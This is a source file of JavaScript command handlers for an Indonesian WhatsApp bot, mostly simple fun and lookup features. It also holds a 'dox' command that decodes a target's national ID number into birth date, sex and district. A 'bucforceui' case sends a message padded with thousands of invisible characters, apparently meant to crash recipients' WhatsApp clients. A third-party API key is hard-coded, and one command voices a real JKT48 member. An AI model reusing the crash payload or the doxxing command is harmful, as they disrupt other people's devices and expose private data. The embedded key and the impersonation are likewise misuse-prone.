 const res = await axios.get(`https://api.ownblox.biz.id/api/pinterest?q=${encodeURIComponent(text)}`);
 const { status, results } = res.data;

 if (status !== 200 || !Array.isArray(results) || results.length === 0) {
 return m.reply(`*[ ❌ ]* Hasil Dari *"${text}"* Tidak Ditemukan -_-`);
 }

 let cap = `*[ 𝙋 𝙄 𝙉 𝙏 𝙀 𝙍 𝙀 𝙎 𝙏 ]*\n\n*Result*: ${text}`;
 let footer = 'By Noisy-Ril';

 const cards = [];
 for (let i = 0; i < Math.min(results.length, 10); i++) {
 const { image } = results[i];
 const media = await prepareWAMessageMedia(
 { image: { url: image } },
 { upload: sock.waUploadToServer }
 );
 const card = {
 body: proto.Message.InteractiveMessage.Body.fromObject({ text: cap }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: footer }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: '',
 hasMediaAttachment: true,
 ...media
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "ʟɪʜᴀᴛ ɢᴀᴍʙᴀʀ",
 url: image
 })
 },
 {
 name: "cta_copy",
 buttonParamsJson: JSON.stringify({
 display_text: "sᴀʟɪɴ ʟɪɴᴋ ɢᴀᴍʙᴀʀ ⎙",
 copy_code: image
 })
 }
 ]
 })
 };
 cards.push(card);
 }

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: { mentionedJid: [m.sender] },
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards }),
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*sɪʟᴀʜᴋᴀɴ ᴄᴇᴋ ɢᴀᴍʙᴀʀ ᴅɪʙᴀᴡᴀʜ*\n@${m.sender.split('@')[0]}`
 })
 })
 }
 }
 },
 {
 userJid: m.chat,
 quoted: m
 }
 );

 return sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 } catch (e) {
 console.error(e);
 return m.reply(`*[ ❌ ]* Terjadi kesalahan, coba lagi nanti.`);
 }
};
break

case 'ayat': {
 if (!text) {
 return m.reply(`Masukkan format:\n${prefix + command} <surah> <ayat>\nContoh: ${prefix + command} 3 4`);
 }

 let [surah, ayat] = text.split(" ");
 if (!surah || !ayat || isNaN(surah) || isNaN(ayat)) {
 return m.reply("Format tidak valid. Pastikan Anda memasukkan angka untuk surah dan ayat.");
 }

 try {
 const url = `https://www.velyn.biz.id/api/search/alquran?surah=${surah}&ayat=${ayat}`;
 const response = await fetch(url);

 if (!response.ok) {
 return m.reply(`Gagal mengambil data. Status: ${response.status}`);
 }

 const data = await response.json();

 if (!data || !data.text) {
 return m.reply("Data tidak ditemukan atau format tidak valid.");
 }

 let output = `📖 *Surah ${data.surah_nama} (${surah}), Ayat ${ayat}*\n\n${data.text}\n\n📜 *Terjemahan:* ${data.translation}\n\n📝 *Tafsir Singkat:* ${data.tafsir}\n\n📌 *Informasi Tambahan:*\n- *Nama Surah:* ${data.surah_nama}\n- *Nomor Surah:* ${data.surah}\n- *Nomor Ayat:* ${data.ayat}\n- *Revelasi:* ${data.revelation_place}\n- *Jumlah Ayat dalam Surah:* ${data.surah_total_ayat}\n- *Tafsir Lengkap:* ${data.tafsir_lengkap}`;

 m.reply(output);

 } catch (error) {
 console.error("Terjadi kesalahan:", error.message);
 m.reply(`Terjadi kesalahan saat mengambil data ayat: ${error.message}`);
 }
};
break;

case "autoai": {
 if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

 if (text === "on") {
 globalAutoAIStatus = true;
 sessions = {}; 
 saveSession();
 return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
 } else if (text === "off") {
 globalAutoAIStatus = false;
 sessions = {}; 
 saveSession();
 return m.reply(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
 } else if (text === "reset") {
 if (globalAutoAIStatus) {
 sessions = {};
 saveSession();
 return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
 } else {
 return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
 }
 }
}
break


case 'reactch1':
case 'rch1': {
 const fonts = {
 font1: {
 a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
 h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
 o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
 v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
 '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
 '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
 },
 font2: {
 a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶',
 h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽',
 o: '🄾', p: '🄿', q: '🅀', r: '🅁', s: '🅂', t: '🅃', u: '🅄',
 v: '🅅', w: '🅆', x: '🅇', y: '🅈', z: '🅉'
 },
 font3: {
 a: '🅰', b: '🅱', c: '🅲', d: '🅳', e: '🅴', f: '🅵', g: '🅶',
 h: '🅷', i: '🅸', j: '🅹', k: '🅺', l: '🅻', m: '🅼', n: '🅽',
 o: '🅾', p: '🅿', q: '🆀', r: '🆁', s: '🆂', t: '🆃', u: '🆄',
 v: '🆅', w: '🆆', x: '🆇', y: '🆈', z: '🆉'
 }
 }

 if (!text.includes('|')) {
 await m.reply(m.chat, `
Format salah. Contoh:\n.reactch font1|https://whatsapp.com/channel/abc/123|halo dunia
Font 1 : 🅐🅑🅒🅓
Font 2 : 🄰🄱🄲🄳
Font 3 : 🅰🅱🅲🅳`, m)
 break
 }

 let [fontKey, link, ...messageParts] = text.split('|')
 fontKey = fontKey.trim().toLowerCase()
 link = link.trim()
 const msg = messageParts.join('|').trim().toLowerCase()

 if (!fonts[fontKey]) {
 await sock.reply(m.chat, `Font tidak dikenal. Gunakan salah satu dari: ${Object.keys(fonts).join(', ')}`, m)
 break
 }

 if (!link.startsWith("https://whatsapp.com/channel/")) {
 await sock.reply(m.chat, "Link tidak valid. Harus diawali dengan https://whatsapp.com/channel/", m)
 break
 }

 const gaya = fonts[fontKey]
 const emoji = msg.split('').map(c => c === ' ' ? '―' : (gaya[c] || c)).join('')

 try {
 const [, , , , channelId, messageId] = link.split('/')
 const res = await sock.newsletterMetadata("invite", channelId)
 await sock.newsletterReactMessage(res.id, messageId, emoji)
 await sock.reply(m.chat, `✅ Reaksi *${emoji}* berhasil dikirim ke channel *${res.name}*.`, m)
 } catch (e) {
 console.error(e)
 await m.reply(m.chat, "❌ Error\nGagal mengirim reaksi. Cek link atau koneksi!", m)
 }
}
break

case 'tourl1': {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 sock.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 // Tombol interaktif
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 body: {
 text: teks
 },
 footer: {
 text: "© WhatsApp Bots - 2025"
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_copy",
 buttonParamsJson: `{"display_text": "SALIN LINK","copy_code": "${url}"}`
 },
 ],
 },
 },
 },
 },
 }, { quoted: m });

 await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
 } catch (e) {
 console.error(e);
 m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 m.reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
 }
};
break

case 'cekkhodamm': {
 if (!text) return m.reply('Contoh: .cekkhodam hairil'); fetch(`https://nusswebb.ptero.web.id/api/cekkhodam?nama=${encodeURIComponent(text)}`)
 .then(res => res.json())
 .then(json => m.reply(json.result.message))
 .catch(() => m.reply('Gagal ambil data khodam.'));
}
 break

case 'mitos': {
				const myths = [
					'🌕 *Mitos Bulan Purnama:* Banyak orang percaya bahwa bulan purnama bisa memengaruhi perilaku manusia, menyebabkan kegilaan, dan meningkatkan angka kejahatan.',
					'🪞 *Mitos Cermin Pecah:* Memecahkan cermin dipercaya membawa nasib buruk selama 7 tahun.',
					'👻 *Mitos Hantu di Pohon Beringin:* Pohon beringin sering dikaitkan dengan makhluk halus dan dipercaya sebagai tempat tinggal roh gentayangan.',
					'🐈‍⬛ *Mitos Kucing Hitam:* Melihat kucing hitam melintas di depanmu sering dianggap sebagai pertanda sial.',
					'💍 *Mitos Cincin di Jari Tengah:* Memakai cincin di jari tengah dipercaya dapat menarik energi positif dan keberuntungan.',
					'🧂 *Mitos Menumpahkan Garam:* Menumpahkan garam dipercaya membawa nasib buruk, kecuali jika dilemparkan ke bahu kiri.',
					'🔮 *Mitos Bola Kristal:* Bola kristal sering dikaitkan dengan kemampuan meramal masa depan.',
					'🎋 *Mitos Pohon Bamboo:* Pohon bamboo di halaman rumah dipercaya bisa mengundang energi positif dan membawa keberuntungan.',
					'🌠 *Mitos Bintang Jatuh:* Jika melihat bintang jatuh dan membuat permintaan, maka permintaan itu akan terkabul.',
					'🐦 *Mitos Burung Masuk Rumah:* Burung yang masuk ke dalam rumah sering dianggap sebagai pertanda akan ada tamu atau berita penting.',
					'🌧️ *Mitos Hujan di Hari Pernikahan:* Hujan di hari pernikahan sering dianggap sebagai pertanda keberuntungan dan kebahagiaan.',
					'🍃 *Mitos Daun Jatuh di Kepala:* Jika ada daun jatuh di kepala seseorang, dipercaya orang itu akan mendapat keberuntungan.',
					'🦉 *Mitos Burung Hantu:* Burung hantu sering dianggap sebagai simbol kematian atau pertanda buruk di beberapa budaya.',
					'🖤 *Mitos Warna Hitam:* Warna hitam sering dikaitkan dengan kesialan dan energi negatif.',
					'🌈 *Mitos Ujung Pelangi:* Konon, ada harta karun di ujung pelangi, tetapi tidak ada yang bisa mencapainya.',
					'🌺 *Mitos Bunga Tumbuh di Makam:* Bunga yang tumbuh subur di makam dipercaya sebagai tanda bahwa roh orang yang dimakamkan itu damai.',
					'🏰 *Mitos Kastil Berhantu:* Banyak kastil tua di Eropa dipercaya dihantui oleh roh para penghuni masa lalu.',
					'💤 *Mitos Mimpi Gigi Copot:* Mimpi gigi copot sering dianggap sebagai pertanda akan ada kematian di keluarga.',
					'🌜 *Mitos Menghitung Bintang:* Menghitung bintang di langit dipercaya bisa membuat seseorang tumbuh jerawat.',
					'🍀 *Mitos Daun Semanggi Berdaun Empat:* Menemukan daun semanggi berdaun empat dipercaya membawa keberuntungan.',
					'🔥 *Mitos Api Menyala Sendiri:* Api yang menyala tiba-tiba di malam hari sering dikaitkan dengan kehadiran roh halus.',
					'🎵 *Mitos Siulan di Malam Hari:* Bersiul di malam hari dipercaya dapat mengundang makhluk halus.',
					'🦎 *Mitos Cicak Jatuh di Kepala:* Jika cicak jatuh di kepala seseorang, dipercaya itu adalah pertanda buruk.',
					'🌺 *Mitos Bunga Sedap Malam:* Aroma bunga sedap malam sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🪦 *Mitos Makam Baru:* Mengunjungi makam yang baru dibuat di malam hari dipercaya dapat membawa energi negatif.',
					'🧟 *Mitos Zombie di Haiti:* Dalam kepercayaan Voodoo Haiti, ada mitos tentang manusia yang dihidupkan kembali sebagai zombie oleh penyihir.',
					'🌟 *Mitos Cahaya Misterius di Malam Hari:* Cahaya aneh yang terlihat di malam hari sering dianggap sebagai roh yang sedang berkeliaran.',
					'🏞️ *Mitos Danau Berhantu:* Banyak danau di dunia yang dipercaya dihuni oleh roh penjaga atau makhluk mitos.',
					'🪶 *Mitos Bulu Putih:* Menemukan bulu putih dipercaya sebagai tanda bahwa malaikat sedang menjaga kita.',
					'🍃 *Mitos Angin Berhembus Kencang Tiba-Tiba:* Angin yang tiba-tiba berhembus kencang sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🎭 *Mitos Topeng Berhantu:* Beberapa topeng tradisional dipercaya memiliki roh atau energi mistis yang kuat.',
					'🗿 *Mitos Patung Tua:* Patung tua sering dianggap memiliki roh atau kutukan di dalamnya.',
					'⚰️ *Mitos Peti Mati Bergerak:* Ada mitos di beberapa budaya bahwa peti mati bisa bergerak sendiri jika ada roh yang tidak tenang.',
					'🔔 *Mitos Lonceng Berbunyi Sendiri:* Jika lonceng berbunyi sendiri tanpa ada angin atau yang memukulnya, sering dianggap sebagai tanda roh yang ingin berkomunikasi.'
				];
				const randomMyth = myths[Math.floor(Math.random() * myths.length)];
 m.reply(`🪄 *Mitos Menarik*\n\n${randomMyth}`);
				break;
          }
case 'joke': {
				const jokes = [
					'🤣 Kenapa kucing gak suka online? Karena takut kena mouse!',
					'🤣 Apa bahasa Jepangnya diskon? Murah-murashii!',
					'🤣 Kenapa sepeda gak bisa berdiri sendiri? Karena lelah!',
					'🤣 Kenapa ikan gak pernah ketabrak saat berenang? Karena selalu lihat ke kiri dan kanan!',
					'🤣 Hewan apa yang gak pernah salah? Kuda, karena selalu di jalur yang benar!',
					'🤣 Kenapa matematika bikin pusing? Karena kalau dihitung terus, gak ada habisnya!',
					'🤣 Apa bedanya jemuran sama orang ngambek? Kalau jemuran dijemur, kalau orang ngambek diem-diem aja!',
					'🤣 Kenapa pohon kelapa di depan rumah harus ditebang? Soalnya kalau dicabut berat!',
					'🤣 Ayam apa yang bikin lelah? Ayam capek (cape)!',
					'🤣 Kalau ikan jadi presiden, siapa wakilnya? Ikan Hiu… Hiupresiden!',
					'🤣 Kenapa komputer suka kerja lembur? Soalnya takut di-*shutdown*!',
					'🤣 Apa bahasa Jepangnya air terjun? Byur-byur-yamashita!',
					'🤣 Kenapa guru selalu bawa buku? Karena kalau bawa genteng berat!',
					'🤣 Hewan apa yang paling kaya? Beruang... Karena punya *bear*-ang!',
					'🤣 Kenapa burung gagak gak pernah ke gym? Karena udah punya *sayap*!',
					'🤣 Kenapa tikus suka ke bioskop? Karena di sana banyak *trail*r (tikus rela)!',
					'🤣 Apa yang lebih kecil dari semut? Bayinya semut!',
					'🤣 Kenapa Superman gak pernah pake baju warna hijau? Karena warnanya udah dipake Hulk!',
					'🤣 Kenapa lampu merah suka bikin macet? Soalnya dia suka berhenti di tempat!',
					'🤣 Kenapa nasi goreng lebih populer daripada nasi putih? Karena nasi putih gak ada suaranya pas dimasak!'
				];
				const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
				m.reply(randomJoke);
				break;
			}

case 'cekganteng': {
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kakak ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '😎 Lumayan ganteng sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!';
				m.reply(`👑 *Cek Ganteng*\n\nKegantengan Kakak ada di angka *${percentage}%*\n${komentar}`);
				break;
			}

case 'cekcantik': {
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kakak ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '😍 Lumayan cantik sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!'; 
    m.reply(`👑 *Cek Cantik*\n\nKecantikan Kakak ada di angka *${percentage}%*\n${komentar}`);
				break;
			}

case 'cekkpribadian': {
				const kepribadian = [
					'🧠 Cerdas dan bijaksana.',
					'❤️ Penuh kasih sayang dan perhatian.',
					'🔥 Bersemangat dan penuh energi.',
					'🎭 Misterius dan sulit ditebak.',
					'😄 Ramah dan menyenangkan.',
					'😎 Cool dan tenang dalam segala situasi.',
					'😅 Sering baperan, tapi baik hati.'
				];
				const randomKepribadian = kepribadian[Math.floor(Math.random() * kepribadian.length)];
				m.reply(`🪄 *Cek Kepribadian*\n\nKakak memiliki kepribadian:\n${randomKepribadian}`);
				break;
			}

case 'upchv2': {
 if (!isCmd) return;
 if (!quoted) {
 return m.reply(`🖼️ *Fotonya mana?*`);
 }
 
 if (!args.length) {
 return m.reply(`⚠️ *Masukkan ID channel dan teks/caption menggunakan format idch|text.*`);
 }
 
 // Memisahkan ID channel dan teks caption dari input menggunakan "|"
 const input = args.join(' ').split('|');
 const channelId = input[0].trim(); // ID channel
 const caption = input[1] ? input[1].trim() : wm2 ; // Caption default jika tidak ada teks
 
 // Cek apakah media adalah gambar
 if (/image/.test(mime)) {
 let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
 
 try {
 // Mengupload gambar ke channel dengan caption custom
 await sock.sendMessage(channelId, {
 image: media,
 caption: caption
 });
 
 // Mengirim pesan konfirmasi
 await m.reply(`✅ *Media gambar berhasil diupload ke channel:* ${channelId}`);
 } catch (error) {
 console.error('Error saat mengupload media gambar:', error);
 await m.reply('❌ *Gagal mengupload gambar. Silakan periksa ID channel dan format media.*');
 }
 } 
 // Cek apakah media adalah audio dan mengirim sebagai VN
 else if (/audio/.test(mime)) {
 let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
 
 try {
 // Mengupload audio sebagai voice note (VN) ke channel
 await sock.sendMessage(channelId, {
 audio: media,
 ptt: true, // Mengirim sebagai pesan suara (voice note)
 mimetype: 'audio/mp4' // Ganti jika perlu
 });
 
 // Mengirim pesan konfirmasi
 await m.reply(`✅ *Voice note berhasil diupload ke channel:* ${channelId}`);
 } catch (error) {
 console.error('Error saat mengupload voice note:', error);
 await m.reply('❌ *Gagal mengupload voice note. Silakan periksa ID channel dan format media.*');
 }
 } else {
 await m.reply(`📸 *Silakan kirim atau balas foto atau audio dengan caption* ${prefix + command}`);
 }
 
 }
 break;

case 'nikparser': case 'dox':
 if (!isCreator) return m.reply("KAU NI APE")
 if (!q) return m.reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
 const { nikParser } = require('nik-parser')
 const ktp = q
 const nik = nikParser(ktp)
 m.reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
 break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await sock.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case 'voice-michie': {
 if (!text) {
 return m.reply(`*Contoh:* ${prefix + command} michie,Haii ceee`);
 }
const [voice, ...messageParts] = text.split(','); 
const message = messageParts.join(',').trim();

 let prompt = `Nama kamu adalah michie dari jkt48, kamu adalah seorang wanita yang lembut dan penuh kasih sayang. Berbicara dengan nada yang lembut, hangat, dan penuh perhatian. Suaramu menenangkan dan penuh empati, seperti seorang sahabat yang selalu mendengarkan. Tanggapi pesan berikut dengan kelembutan dan kebaikan hati: "${message}"`;
 
// © XyrooRynzz
 const requestData = { content: message, user: m.sender, prompt: prompt };

 try {
 const response = await axios.post('https://luminai.my.id', requestData);
 const generatedText = response.data.result;
 const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=Bell409&voice=michi_jkt48`;
 const audioResponse = await fetch(ttsUrl);
// © XyrooRynzz
 if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
 const audioBuffer = await audioResponse.arrayBuffer();

 sock.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 } catch (err) {
 console.error('Terjadi kesalahan:', err);
 m.reply('Terjadi kesalahan saat memproses permintaan Anda.');
 }
// © XyrooRynzz
}
break

case 'bucforceui':
 m.reply('*NOISY CRASH🪬* ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎